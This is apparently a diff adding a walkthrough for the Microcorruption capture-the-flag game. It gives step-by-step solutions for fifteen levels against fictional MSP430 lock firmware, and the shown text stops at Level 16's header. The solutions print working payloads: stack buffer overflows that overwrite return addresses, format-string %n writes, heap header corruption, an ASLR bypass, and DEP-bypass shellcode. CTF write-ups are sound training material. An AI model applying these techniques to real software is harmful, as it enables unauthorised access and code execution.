@@ -1,0 +1,1204 @@
+Level 0: Tutorial
+
+
+
+Level 1: New Orleans 
+
+OVERVIEW
+
+    - This is the first LockIT Pro Lock.
+    - This lock is not attached to any hardware security module.
+
+
+DETAILS
+
+    The LockIT Pro a.01  is the first of a new series  of locks. It is
+    controlled by a  MSP430 microcontroller, and is  the most advanced
+    MCU-controlled lock available on the  market. The MSP430 is a very
+    low-power device which allows the LockIT  Pro to run in almost any
+    environment.
+
+    The  LockIT  Pro   contains  a  Bluetooth  chip   allowing  it  to
+    communiciate with the  LockIT Pro App, allowing the  LockIT Pro to
+    be inaccessable from the exterior of the building.
+
+    There is  no default password  on the LockIT  Pro---upon receiving
+    the LockIT Pro, a new password must be set by connecting it to the
+    LockIT Pro  App and  entering a password  when prompted,  and then
+    restarting the LockIT Pro using the red button on the back.
+    
+    This is Hardware  Version A.  It contains  the Bluetooth connector
+    built in, and one available port  to which the LockIT Pro Deadbolt
+    should be connected.
+
+
+Solution:
+break main
+continue
+# Note 'create_password' creates the correct password at 0x2400
+c
+Wait
+# The correct password is at 0x2400 = fVk*s!!
+solve
+Input: fVk*s!!
+
+
+Level 2: Sydney
+
+OVERVIEW
+
+    - We have revised the software in revision 02.
+    - This lock is not attached to any hardware security module.
+
+
+DETAILS
+
+    The LockIT Pro a.02  is the first of a new series  of locks. It is
+    controlled by a  MSP430 microcontroller, and is  the most advanced
+    MCU-controlled lock available on the  market. The MSP430 is a very
+    low-power device which allows the LockIT  Pro to run in almost any
+    environment.
+
+    The  LockIT  Pro   contains  a  Bluetooth  chip   allowing  it  to
+    communiciate with the  LockIT Pro App, allowing the  LockIT Pro to
+    be inaccessable from the exterior of the building.
+
+    There is  no default password  on the LockIT  Pro---upon receiving
+    the LockIT Pro, a new password must be set by connecting it to the
+    LockIT Pro  App and  entering a password  when prompted,  and then
+    restarting the LockIT Pro using the red button on the back.
+    
+    This is Hardware  Version A.  It contains  the Bluetooth connector
+    built in, and one available port  to which the LockIT Pro Deadbolt
+    should be connected.
+
+    This is  Software Revision 02.  We have received reports  that the
+    prior  version of  the  lock was  bypassable  without knowing  the
+    password. We have fixed this and removed the password from memory.
+
+
+Solution:
+break main
+c
+'''
+Note 'check_password' reads our input sequentially and compares it directly
+Taking into account that the machine deals in 16-bit little endian:
+0x3c72 = r<
+0x515b = [Q
+0x582d = -X
+0x4f69 = iO
+'''
+reset
+solve
+Password: r<[Q-XiO
+
+
+Level 3: Hanoi
+
+OVERVIEW
+
+    - This lock is attached the the LockIT Pro HSM-1.
+    - We have updated  the lock firmware  to connect with the hardware
+      security module.
+
+
+DETAILS
+
+    The LockIT Pro b.01  is the first of a new series  of locks. It is
+    controlled by a  MSP430 microcontroller, and is  the most advanced
+    MCU-controlled lock available on the  market. The MSP430 is a very
+    low-power device which allows the LockIT  Pro to run in almost any
+    environment.
+
+    The  LockIT  Pro   contains  a  Bluetooth  chip   allowing  it  to
+    communiciate with the  LockIT Pro App, allowing the  LockIT Pro to
+    be inaccessable from the exterior of the building.
+
+    There  is no  default  password  on the  LockIT  Pro HSM-1.   Upon
+    receiving the  LockIT Pro,  a new  password must  be set  by first
+    connecting the LockitPRO HSM to  output port two, connecting it to
+    the LockIT Pro App, and entering a new password when prompted, and
+    then restarting the LockIT Pro using the red button on the back.
+
+    LockIT Pro Hardware  Security Module 1 stores  the login password,
+    ensuring users  can not access  the password through  other means.
+    The LockIT Pro  can send the LockIT Pro HSM-1  a password, and the
+    HSM will  return if the password  is correct by setting  a flag in
+    memory.
+    
+    This is Hardware  Version B.  It contains  the Bluetooth connector
+    built in, and two available  ports: the LockIT Pro Deadbolt should
+    be  connected to  port  1,  and the  LockIT  Pro  HSM-1 should  be
+    connected to port 2.
+
+Solution:
+break main
+c
+# Note at 0x455a : cmp.b	#0x40, &0x2410
+# 0x40 = @
+c
+Input: aaaabbbb
+# Note our input starts at 0x2400
+# 2410 - 2400 = 16
+python -c "print 'a' * 16 + '@'"
+reset
+c
+c
+Input: aaaaaaaaaaaaaaaa@
+c
+# We got our solution
+solve
+Input: aaaaaaaaaaaaaaaa@
+
+
+Level 4: Reykjavik
+
+OVERVIEW
+
+    - Lockitall developers  have implemented  military-grade on-device
+      encryption to keep the password secure.
+    - This lock is not attached to any hardware security module.
+
+
+DETAILS
+
+    The LockIT Pro a.03  is the first of a new series  of locks. It is
+    controlled by a  MSP430 microcontroller, and is  the most advanced
+    MCU-controlled lock available on the  market. The MSP430 is a very
+    low-power device which allows the LockIT  Pro to run in almost any
+    environment.
+
+    The  LockIT  Pro   contains  a  Bluetooth  chip   allowing  it  to
+    communiciate with the  LockIT Pro App, allowing the  LockIT Pro to
+    be inaccessable from the exterior of the building.
+
+    There is  no default password  on the LockIT  Pro---upon receiving
+    the LockIT Pro, a new password must be set by connecting it to the
+    LockIT Pro  App and  entering a password  when prompted,  and then
+    restarting the LockIT Pro using the red button on the back.
+    
+    This is Hardware  Version A.  It contains  the Bluetooth connector
+    built in, and one available port  to which the LockIT Pro Deadbolt
+    should be connected.
+
+    This is Software Revision 02. This release contains military-grade
+    encryption so users can be confident that the passwords they enter
+    can not be read from memory.   We apologize for making it too easy
+    for the password to be recovered on prior versions.  The engineers
+    responsible have been sacked.
+
+Solution:
+break main
+c
+# Note call to 2400
+break 2400
+c
+read 2400 180
+Copy the output
+Open the Assembler in a new tab
+Paste the output -> Disassemble
+# Note the cmp	#0x869d, -0x24(r4)
+# -0x24(r4) = 0x43fe - 0x24 = 0x43da
+c
+Input: aaaa
+# Note that -0x24(r4) is the location of the start of our input
+reset
+solve
+Password (hex encoded input): 9d86
+
+
+Level 5: Cusco
+
+OVERVIEW
+
+    - We have fixed issues with passwords which may be too long.
+    - This lock is attached the the LockIT Pro HSM-1.
+
+
+DETAILS
+
+    The LockIT Pro b.02  is the first of a new series  of locks. It is
+    controlled by a  MSP430 microcontroller, and is  the most advanced
+    MCU-controlled lock available on the  market. The MSP430 is a very
+    low-power device which allows the LockIT  Pro to run in almost any
+    environment.
+
+    The  LockIT  Pro   contains  a  Bluetooth  chip   allowing  it  to
+    communiciate with the  LockIT Pro App, allowing the  LockIT Pro to
+    be inaccessable from the exterior of the building.
+
+    There  is no  default  password  on the  LockIT  Pro HSM-1.   Upon
+    receiving the  LockIT Pro,  a new  password must  be set  by first
+    connecting the LockitPRO HSM to  output port two, connecting it to
+    the LockIT Pro App, and entering a new password when prompted, and
+    then restarting the LockIT Pro using the red button on the back.
+    
+    LockIT Pro Hardware  Security Module 1 stores  the login password,
+    ensuring users  can not access  the password through  other means.
+    The LockIT Pro  can send the LockIT Pro HSM-1  a password, and the
+    HSM will  return if the password  is correct by setting  a flag in
+    memory.
+    
+    This is Hardware  Version B.  It contains  the Bluetooth connector
+    built in, and two available  ports: the LockIT Pro Deadbolt should
+    be  connected to  port  1,  and the  LockIT  Pro  HSM-1 should  be
+    connected to port 2.
+
+    This is Software Revision 02. We have improved the security of the
+    lock by  removing a conditional  flag that could  accidentally get
+    set by passwords that were too long.
+
+Solution:
+break main
+c
+break 453e
+# Breaking the return address of login
+python -c "print '41' * 20"
+Input: 4141414141414141414141414141414141414141
+c
+read sp 8
+# Note our input starts at 0x43ee and the stack pointer is at 0x43fe
+python -c "print 0x43fe - 0x43ee"
+# The result is 16
+# Note unlock_door starts at 4446
+python -c "print '41' * 16 + '4644'"
+solve
+Password (hex encoded input): 414141414141414141414141414141414644
+
+
+Level 6: Whitehorse
+
+OVERVIEW
+
+    - This lock is attached the the LockIT Pro HSM-2.
+    - We have updated  the lock firmware to connect with this hardware
+      security module.
+
+
+DETAILS
+
+    The LockIT Pro c.01  is the first of a new series  of locks. It is
+    controlled by a  MSP430 microcontroller, and is  the most advanced
+    MCU-controlled lock available on the  market. The MSP430 is a very
+    low-power device which allows the LockIT  Pro to run in almost any
+    environment.
+
+    The  LockIT  Pro   contains  a  Bluetooth  chip   allowing  it  to
+    communiciate with the  LockIT Pro App, allowing the  LockIT Pro to
+    be inaccessable from the exterior of the building.
+
+    There  is no  default  password  on the  LockIT  Pro HSM-2.   Upon
+    receiving the  LockIT Pro,  a new  password must  be set  by first
+    connecting the LockitPRO HSM to  output port two, connecting it to
+    the LockIT Pro App, and entering a new password when prompted, and
+    then restarting the LockIT Pro using the red button on the back.
+    
+    LockIT Pro Hardware  Security Module 2 stores  the login password,
+    ensuring users  can not access  the password through  other means.
+    The LockIT Pro  can send the LockIT Pro HSM-2  a password, and the
+    HSM will  directly send the  correct unlock message to  the LockIT
+    Pro Deadbolt  if the password  is correct, otherwise no  action is
+    taken.
+    
+    This is Hardware  Version C.  It contains  the Bluetooth connector
+    built in, and two available  ports: the LockIT Pro Deadbolt should
+    be  connected to  port  1,  and the  LockIT  Pro  HSM-2 should  be
+    connected to port 2.
+
+    This is  Software Revision  01. The firmware  has been  updated to
+    connect with the new hardware security module. We have removed the
+    function to unlock the door from the LockIT Pro firmware.
+
+Solution:
+break main
+c
+break 4514
+# Breaking conditional_unlock_door
+break 452e
+# Breaking login's return address
+python -c "print '41' * 20"
+Input: 4141414141414141414141414141414141414141
+c
+read sp 8
+# Note our input starts at 0x3600 and the stack pointer is at 0x3610
+# The offset is 16
+# Note that conditional_unlock_door calls INT 0x7f at 0x4460
+# Read the manual for the interrupt listing
+python -c "print '41' * 16 + '60447f'"
+solve
+Password (hex encoded input): 4141414141414141414141414141414160447f
+
+
+Level 7: Montevideo
+
+OVERVIEW
+
+    - Lockitall developers  have rewritten the code  to conform to the
+      internal secure development process.
+    - This lock is attached the the LockIT Pro HSM-2.
+
+
+DETAILS
+
+    The LockIT Pro c.03  is the first of a new series  of locks. It is
+    controlled by a  MSP430 microcontroller, and is  the most advanced
+    MCU-controlled lock available on the  market. The MSP430 is a very
+    low-power device which allows the LockIT  Pro to run in almost any
+    environment.
+
+    The  LockIT  Pro   contains  a  Bluetooth  chip   allowing  it  to
+    communiciate with the  LockIT Pro App, allowing the  LockIT Pro to
+    be inaccessable from the exterior of the building.
+
+    There  is no  default  password  on the  LockIT  Pro HSM-2.   Upon
+    receiving the  LockIT Pro,  a new  password must  be set  by first
+    connecting the LockitPRO HSM to  output port two, connecting it to
+    the LockIT Pro App, and entering a new password when prompted, and
+    then restarting the LockIT Pro using the red button on the back.
+    
+    LockIT Pro Hardware  Security Module 2 stores  the login password,
+    ensuring users  can not access  the password through  other means.
+    The LockIT Pro  can send the LockIT Pro HSM-2  a password, and the
+    HSM will  directly send the  correct unlock message to  the LockIT
+    Pro Deadbolt  if the password  is correct, otherwise no  action is
+    taken.
+    
+    This is Hardware  Version C.  It contains  the Bluetooth connector
+    built in, and two available  ports: the LockIT Pro Deadbolt should
+    be  connected to  port  1,  and the  LockIT  Pro  HSM-2 should  be
+    connected to port 2.
+
+    This is Software Revision 03. We have received unconfirmed reports
+    of issues with the previous series of locks. We have reimplemented
+    much  of the  code according  to our  internal Secure  Development
+    Process.
+
+Solution:
+break main
+c
+# Note Montevideo looks very similar to Whitehorse
+# Let us try the same solution
+c
+Input: 4141414141414141414141414141414160447f
+c
+# The same solution works
+solve
+Password (hex encoded input): 4141414141414141414141414141414160447f
+
+
+Level 8: Johannesburg
+
+OVERVIEW
+
+    - A firmware update rejects passwords which are too long.
+    - This lock is attached the the LockIT Pro HSM-1.
+
+
+DETAILS
+
+    The LockIT Pro b.04  is the first of a new series  of locks. It is
+    controlled by a  MSP430 microcontroller, and is  the most advanced
+    MCU-controlled lock available on the  market. The MSP430 is a very
+    low-power device which allows the LockIT  Pro to run in almost any
+    environment.
+
+    The  LockIT  Pro   contains  a  Bluetooth  chip   allowing  it  to
+    communiciate with the  LockIT Pro App, allowing the  LockIT Pro to
+    be inaccessable from the exterior of the building.
+
+    There  is no  default  password  on the  LockIT  Pro HSM-1.   Upon
+    receiving the  LockIT Pro,  a new  password must  be set  by first
+    connecting the LockitPRO HSM to  output port two, connecting it to
+    the LockIT Pro App, and entering a new password when prompted, and
+    then restarting the LockIT Pro using the red button on the back.
+    
+    LockIT Pro Hardware  Security Module 1 stores  the login password,
+    ensuring users  can not access  the password through  other means.
+    The LockIT Pro  can send the LockIT Pro HSM-1  a password, and the
+    HSM will  return if the password  is correct by setting  a flag in
+    memory.
+    
+    This is Hardware  Version B.  It contains  the Bluetooth connector
+    built in, and two available  ports: the LockIT Pro Deadbolt should
+    be  connected to  port  1,  and the  LockIT  Pro  HSM-1 should  be
+    connected to port 2.
+
+    This is Software Revision 04. We have improved the security of the
+    lock by ensuring passwords that are too long will be rejected.
+
+Solution:
+break main
+c
+# Note the address 0x4578 in login has cmp.b	#0x18, 0x11(sp)
+break 4590
+c
+c
+c
+# Note that we see the 18, 18 bytes after our input
+# This 18 acts like a stack canary, read: 
+# https://en.wikipedia.org/wiki/Stack_buffer_overflow#Stack_canaries
+# Note unlock_door starts at 4446
+python -c "print '41' * 17 + '18' + '4644'"
+reset
+c
+c
+Input: 4141414141414141414141414141414141184644
+c
+c
+c
+# We got our solution
+solve
+Password (hex encoded input): 4141414141414141414141414141414141184644
+
+
+Level 9: Addis Adaba
+
+OVERVIEW
+
+    - We have verified passwords can not be too long.
+    - Usernames are printed back to the user for verification.
+    - This lock is attached the the LockIT Pro HSM-1.
+
+
+DETAILS
+
+    The LockIT Pro b.03  is the first of a new series  of locks. It is
+    controlled by a  MSP430 microcontroller, and is  the most advanced
+    MCU-controlled lock available on the  market. The MSP430 is a very
+    low-power device which allows the LockIT  Pro to run in almost any
+    environment.
+
+    The  LockIT  Pro   contains  a  Bluetooth  chip   allowing  it  to
+    communiciate with the  LockIT Pro App, allowing the  LockIT Pro to
+    be inaccessable from the exterior of the building.
+
+    There  is no  default  password  on the  LockIT  Pro HSM-1.   Upon
+    receiving the  LockIT Pro,  a new  password must  be set  by first
+    connecting the LockitPRO HSM to  output port two, connecting it to
+    the LockIT Pro App, and entering a new password when prompted, and
+    then restarting the LockIT Pro using the red button on the back.
+    
+    LockIT Pro Hardware  Security Module 1 stores  the login password,
+    ensuring users  can not access  the password through  other means.
+    The LockIT Pro  can send the LockIT Pro HSM-1  a password, and the
+    HSM will  return if the password  is correct by setting  a flag in
+    memory.
+    
+    This is Hardware  Version B.  It contains  the Bluetooth connector
+    built in, and two available  ports: the LockIT Pro Deadbolt should
+    be  connected to  port  1,  and the  LockIT  Pro  HSM-1 should  be
+    connected to port 2.
+
+    This is Software Revision 03. We have improved the security of the
+    lock by ensuring passwords can not be too long.
+
+Solution:
+break main 
+c
+# Note the printf; there may be a format string vulnerability 
+break 448a
+# Breaking the test
+c
+Input: <nothing>
+c
+# Note the address being tested is at 0x3c50
+# We have to write a non-zero number to that address to skip the jz,
+# and call unlock_door
+# 0x503c + %i + %n = 503c + 2569 + 256e = 503c2569256e
+# The %n will write a 2 to 0x503c
+reset
+c
+c
+Input: 503c2569256e
+c
+c
+# We got our solution
+solve
+Password (hex encoded input): 503c2569256e
+
+
+Level 10: Santa Cruz
+
+OVERVIEW
+
+    - A firmware update further rejects passwords which are too long.
+    - This lock is attached the the LockIT Pro HSM-1.
+
+
+DETAILS
+
+    The LockIT Pro b.05  is the first of a new series  of locks. It is
+    controlled by a  MSP430 microcontroller, and is  the most advanced
+    MCU-controlled lock available on the  market. The MSP430 is a very
+    low-power device which allows the LockIT  Pro to run in almost any
+    environment.
+
+    The  LockIT  Pro   contains  a  Bluetooth  chip   allowing  it  to
+    communiciate with the  LockIT Pro App, allowing the  LockIT Pro to
+    be inaccessable from the exterior of the building.
+
+    There  is no  default  password  on the  LockIT  Pro HSM-1.   Upon
+    receiving the  LockIT Pro,  a new  password must  be set  by first
+    connecting the LockitPRO HSM to  output port two, connecting it to
+    the LockIT Pro App, and entering a new password when prompted, and
+    then restarting the LockIT Pro using the red button on the back.
+    
+    LockIT Pro Hardware  Security Module 1 stores  the login password,
+    ensuring users  can not access  the password through  other means.
+    The LockIT Pro  can send the LockIT Pro HSM-1  a password, and the
+    HSM will  return if the password  is correct by setting  a flag in
+    memory.
+    
+    This is Hardware  Version B.  It contains  the Bluetooth connector
+    built in, and two available  ports: the LockIT Pro Deadbolt should
+    be  connected to  port  1,  and the  LockIT  Pro  HSM-1 should  be
+    connected to port 2.
+
+    This is Software Revision 05.  We have added further mechanisms to
+    verify that passwords which are too long will be rejected.
+
+Solution:
+break main
+c
+# Note the address of unlock_door is 0x444a
+c
+user: aaaa
+pass: bbbb
+c
+# Note that the user is at 0x43a2 and the password at 0x43b5
+# Note that the stack pointer is at 0x43a0 and the ret address at 0x43cc
+# Note the mov.b -0x18(r4), r15 at login's 0x45e4
+read r4-18
+# The resulting address is 0x43b4 and it has a value of 0x10
+# Note the mov.b -0x19(r4), r15 at login's 0x45fa
+read r4-19
+# The resulting address is 0x43b3 and it has a value of 0x08
+# Note the tst.b -0x6(r4) at login's 0x464c
+# Note the jz #0x465e <login+0x10e> at login's 0x4650
+read r4-6
+# The resulting address is 0x43c6, meaning 0x43c6 must be 0x0
+# We want to overwrite the ret address with that of unlock_door
+# We also want to make sure that the value of 0x43b3 is lower than our
+# password length and 0x43b4 is higher than our password length
+python -c "print 0x43cc - 0x43a2"
+# The result is 42
+python -c "print ('61' * 17) + '01' + ('61' * 24) + '4a44'"
+# We want to overwrite the 0x43c6 address with 0x0
+python -c "print 0x43c6 - 0x43b5"
+# The result is 17
+python -c "print '62' * 17 + '00'"
+reset
+c
+c
+user: 6161616161616161616161616161616161016161616161616161616161616161616161616161616161614a44
+c
+pass: 626262626262626262626262626262626200
+c
+# We got our solution
+solve
+user: 6161616161616161616161616161616161016161616161616161616161616161616161616161616161614a44
+pass: 626262626262626262626262626262626200
+
+
+Level 11: Jakarta
+
+OVERVIEW
+
+    - A firmware update further rejects passwords which are too long.
+    - This lock is attached the the LockIT Pro HSM-1.
+
+
+DETAILS
+
+    The LockIT Pro b.06  is the first of a new series  of locks. It is
+    controlled by a  MSP430 microcontroller, and is  the most advanced
+    MCU-controlled lock available on the  market. The MSP430 is a very
+    low-power device which allows the LockIT  Pro to run in almost any
+    environment.
+
+    The  LockIT  Pro   contains  a  Bluetooth  chip   allowing  it  to
+    communiciate with the  LockIT Pro App, allowing the  LockIT Pro to
+    be inaccessable from the exterior of the building.
+
+    There  is no  default  password  on the  LockIT  Pro HSM-1.   Upon
+    receiving the  LockIT Pro,  a new  password must  be set  by first
+    connecting the LockitPRO HSM to  output port two, connecting it to
+    the LockIT Pro App, and entering a new password when prompted, and
+    then restarting the LockIT Pro using the red button on the back.
+    
+    LockIT Pro Hardware  Security Module 1 stores  the login password,
+    ensuring users  can not access  the password through  other means.
+    The LockIT Pro  can send the LockIT Pro HSM-1  a password, and the
+    HSM will  return if the password  is correct by setting  a flag in
+    memory.
+    
+    This is Hardware  Version B.  It contains  the Bluetooth connector
+    built in, and two available  ports: the LockIT Pro Deadbolt should
+    be  connected to  port  1,  and the  LockIT  Pro  HSM-1 should  be
+    connected to port 2.
+
+    This is Software Revision 06.  We have added further mechanisms to
+    verify that passwords which are too long will be rejected.
+
+Solution:
+break main
+c
+# Note unlock_door is at 0x444c
+# Note the cmp.b #0x21, r11 in login's 0x45ae,
+# this checks for the username meeting the 0x20 limit
+# Note the add	r11, r15 at 0x45fe and the cmp.b #0x21, r15 at 0x4600,
+# this checks for the combined length of user and pass against 0xff
+c
+python -c "print '61' * 32"
+Input: 6161616161616161616161616161616161616161616161616161616161616161
+c
+python -c "print '61' * 4 + '4c44' + '62' * 218"
+Input: 616161614c446262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262
+c
+c
+# We got our solution
+solve
+user: 6161616161616161616161616161616161616161616161616161616161616161
+pass: 616161614c446262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262
+
+
+Level 12: Novosibirsk
+
+OVERVIEW
+
+    - This lock is attached the the LockIT Pro HSM-2.
+    - We have added features from b.03 to the new hardware.
+
+
+DETAILS
+
+    The LockIT Pro c.02  is the first of a new series  of locks. It is
+    controlled by a  MSP430 microcontroller, and is  the most advanced
+    MCU-controlled lock available on the  market. The MSP430 is a very
+    low-power device which allows the LockIT  Pro to run in almost any
+    environment.
+
+    The  LockIT  Pro   contains  a  Bluetooth  chip   allowing  it  to
+    communiciate with the  LockIT Pro App, allowing the  LockIT Pro to
+    be inaccessable from the exterior of the building.
+
+    There  is no  default  password  on the  LockIT  Pro HSM-2.   Upon
+    receiving the  LockIT Pro,  a new  password must  be set  by first
+    connecting the LockitPRO HSM to  output port two, connecting it to
+    the LockIT Pro App, and entering a new password when prompted, and
+    then restarting the LockIT Pro using the red button on the back.
+    
+    LockIT Pro Hardware  Security Module 2 stores  the login password,
+    ensuring users  can not access  the password through  other means.
+    The LockIT Pro  can send the LockIT Pro HSM-2  a password, and the
+    HSM will  directly send the  correct unlock message to  the LockIT
+    Pro Deadbolt  if the password  is correct, otherwise no  action is
+    taken.
+    
+    This is Hardware  Version C.  It contains  the Bluetooth connector
+    built in, and two available  ports: the LockIT Pro Deadbolt should
+    be  connected to  port  1,  and the  LockIT  Pro  HSM-2 should  be
+    connected to port 2.
+
+    This is Software Revision 02. We have improved the security of the
+    lock by ensuring passwords can not be too long.
+
+Solution:
+break main
+c
+# Note the printf; there may be a format string vulnerability
+break 448e
+c
+Input: aaaa
+c
+# Note that conditional_unlock_door pushes 0x7e to INT at 0x44c6
+# We want to overwrite it to 0x7f, so that INT 0x7f gets called instead
+# Note that 0x7f = 127
+# 0x44c8 + 125 A's + %n = c844 + <A's> + 256e
+# The %n will overwrite the 0x7e with 0x7f
+reset
+c
+c
+Input: c8446161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161256e
+# We got our solution
+solve
+Input: c8446161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161256e
+
+
+Level 13: Algiers
+
+OVERVIEW
+
+    - This lock contains the all-new LockIT Pro Account Manager.
+
+
+DETAILS
+
+    The LockIT Pro d.01  is the first of a new series  of locks. It is
+    controlled by a  MSP430 microcontroller, and is  the most advanced
+    MCU-controlled lock available on the  market. The MSP430 is a very
+    low-power device which allows the LockIT  Pro to run in almost any
+    environment.
+
+    The  LockIT  Pro   contains  a  Bluetooth  chip   allowing  it  to
+    communiciate with the  LockIT Pro App, allowing the  LockIT Pro to
+    be inaccessable from the exterior of the building.
+
+    LockIT Pro Account Manager solves the problem of sharing passwords
+    when  multiple users  must  have  access to  a  lock. The  Account
+    Manager contains  a mapping of users  to PINs, each of  which is 4
+    digits.  The  system supports  hundreds of users,  each configured
+    with his or her own PIN,  without degrading the performance of the
+    manager.
+
+    There are no accounts set up  on the LockIT Pro Account Manager by
+    default. An administrator must first initialize the lock with user
+    accounts  and  their  PINs.  User  accounts  are  by  default  not
+    authorized  for access,  but can  be authorized  by attaching  the
+    Account  Manager  Authorizer.  This  prevents  users  from  adding
+    themselves to the lock during its use.
+    
+    This is Hardware  Version D.  It contains  the Bluetooth connector
+    built in, and one available port, to which the LockIT Pro Deadbolt
+    should be connected. When authorizing PINs, the Deadbolt should be
+    disconnected and the Authorizer should be attached in its place.
+
+    This   is  Software   Revision   01.  It is a  much more  advanced
+    version of other locks, but the first Version D release.
+
+Solution:
+break main
+c
+user: aaaa
+pass: bbbb
+Read: http://jamesgolick.com/2013/5/15/memory-allocators-101.html
+# Note that we have a metadata header before our inputted data
+# The header contains: 
+(1) pointer to the previous block
+(2) pointer to the next block
+(3) the size of the block
+(4) status of the block; whether it's allocated or free
+# Note that we have two blocks, that each 16 bytes long, and that
+# they're next to each other and there is no check on length of input
+# We can overwrite the header of the second block and make it point to 
+# wherever we want
+# Note that unlock_door is 0x4564 and that free's 0x4562 is right behind
+# We can use NOPs to slide into unlock_door
+python -c "print '61' * 16 + '4444'+ '6245' + '0100'"
+reset
+c
+c
+user: 61616161616161616161616161616161444462450100
+pass: <blank>
+c
+c
+# We got our solution
+solve
+user: 61616161616161616161616161616161444462450100
+pass: <blank>
+
+
+Level 14: Vladivostok
+
+OVERVIEW
+
+    - Lockitall  developers further used the hardware randomization to
+      improve lock security.
+    - This lock is attached the the LockIT Pro HSM-2.
+
+
+DETAILS
+
+    The LockIT Pro c.05  is the first of a new series  of locks. It is
+    controlled by a  MSP430 microcontroller, and is  the most advanced
+    MCU-controlled lock available on the  market. The MSP430 is a very
+    low-power device which allows the LockIT  Pro to run in almost any
+    environment.
+
+    The  LockIT  Pro   contains  a  Bluetooth  chip   allowing  it  to
+    communiciate with the  LockIT Pro App, allowing the  LockIT Pro to
+    be inaccessable from the exterior of the building.
+
+    There  is no  default  password  on the  LockIT  Pro HSM-2.   Upon
+    receiving the  LockIT Pro,  a new  password must  be set  by first
+    connecting the LockitPRO HSM to  output port two, connecting it to
+    the LockIT Pro App, and entering a new password when prompted, and
+    then restarting the LockIT Pro using the red button on the back.
+    
+    LockIT Pro Hardware  Security Module 2 stores  the login password,
+    ensuring users  can not access  the password through  other means.
+    The LockIT Pro  can send the LockIT Pro HSM-2  a password, and the
+    HSM will  directly send the  correct unlock message to  the LockIT
+    Pro Deadbolt  if the password  is correct, otherwise no  action is
+    taken.
+
+    Despite the  year of development  effort which  went in to  it, we
+    have heard  reports that  the memory  protection introduced  in to
+    LockIT Pro r e.01 is insufficient. We have removed this feature in
+    favor of  the tried-and-true HSM-2. The  engineers responsible for
+    LockIT Pro r e.01 have been sacked.
+    
+    This is Hardware  Version C.  It contains  the Bluetooth connector
+    built in, and two available  ports: the LockIT Pro Deadbolt should
+    be  connected to  port  1,  and the  LockIT  Pro  HSM-2 should  be
+    connected to port 2.
+
+    This is  Software Revision 05.  We have implemented  new state-of-
+    the-art techniques to prevent any futher lock issues.
+
+Solution:
+break main
+c
+# We see ASLR is implemented
+# We see printf at 0x476a, so there might be a format string vulnerability
+# Note the INT at 0x48ec
+# 0x48ec - 0x476a = 0x182
+c
+Input: %x%x
+c
+# The program is vulnerable to format string attacks, we get the address of printf
+Input: aaaabbbbcccc
+# Everything gets overwritten
+reset
+c
+c
+Input: %x%x
+# Note the address of printf is 0x9a04
+# Pass = 8 random bytes + (printf_addr + 0x182) + 2 random bytes + 7f00
+python vladivostok.py
+c
+Input: 4141414141414141869b42427f00
+c
+# We got our solution
+solve
+user: %x%x
+# The printf address if 0x74c4
+python vladivostok.py
+pass: 4141414141414141467642427f00
+
+
+Level 15: Bangalore
+
+OVERVIEW
+
+    - The lock uses the first MSP430 ever to have memory protection.
+    - This lock is attached the the LockIT Pro HSM-2.
+
+
+DETAILS
+
+    The LockIT Pro c.01  is the first of a new series  of locks. It is
+    controlled by a  MSP430 microcontroller, and is  the most advanced
+    MCU-controlled lock available on the  market. The MSP430 is a very
+    low-power device which allows the LockIT  Pro to run in almost any
+    environment.
+
+    The  LockIT  Pro   contains  a  Bluetooth  chip   allowing  it  to
+    communiciate with the  LockIT Pro App, allowing the  LockIT Pro to
+    be inaccessable from the exterior of the building.
+
+    There  is no  default  password  on the  LockIT  Pro HSM-2.   Upon
+    receiving the  LockIT Pro,  a new  password must  be set  by first
+    connecting the LockitPRO HSM to  output port two, connecting it to
+    the LockIT Pro App, and entering a new password when prompted, and
+    then restarting the LockIT Pro using the red button on the back.
+    
+    LockIT Pro Hardware  Security Module 2 stores  the login password,
+    ensuring users  can not access  the password through  other means.
+    The LockIT Pro  can send the LockIT Pro HSM-2  a password, and the
+    HSM will  directly send the  correct unlock message to  the LockIT
+    Pro Deadbolt  if the password  is correct, otherwise no  action is
+    taken.
+
+    Lockitall engineers  have worked for  over a year to  bring memory
+    protection to  the MSP430---a  truly amazing achievement.  Each of
+    the 256  pages can  either be executable  or writeable,  but never
+    both, finally  bringing to  a close  some of  the issues  in prior
+    versions.
+
+    This  is Hardware  Version  C. It  contains  the all-new  modified
+    MSP430  with hardware  memory protection.   This hardware  version
+    also contains the Bluetooth connector  built in, and two available
+    ports: the LockIT Pro Deadbolt should  be connected to port 1, and
+    the LockIT Pro HSM-2 should be connected to port 2.
+
+    This is Software Revision 01. The new firmware supports the memory
+    protection we have introduced in this new hardware version.
+
+Solve:
+break main
+c
+# This program has DEP (Data Execution Prevention) enabled
+# The manual and the code both show that pages are either executable or writable
+# 0x1 makes the page as writable and 0x0 marks it as executable
+c
+python -c "print '61' * 20"
+Input: 6161616161616161616161616161616161616161
+# Note our input starts at 0x3fee
+reset
+c
+c
+python -c "print '61' * 16 + 'ee3f'"
+Input: 61616161616161616161616161616161ee3f
+c
+# We get a segmentation fault, saying it cannot execute a write-only page
+# We need to set the page where our input is to executable (0x44ba)
+# The format we will use is:
+<shellcode><buffer><mark_page_executable><page num><executable mark><input addr>
+# This will mark our input page as executable and then execute our shellcode
+Assemble:
+mov       #0xff00, sr 
+call      #0x10
+# Where 0xff00 is 0x8000 + 0x7f00
+# The assembled objects are: 324000ffb0121000
+solve
+python -c "print '324000ffb0121000' + '61' * 8 + 'ba44' + '3f00' + '0000' + 'ee3f'"
+Input: 324000ffb01210006161616161616161ba443f000000ee3f
+
+
+Level 16: Lagos
+
+OVERVIEW
+
+    - Passwords may now only contain alphanumeric characters.
+    - This lock is attached the the LockIT Pro HSM-2.
+
+
+DETAILS
+
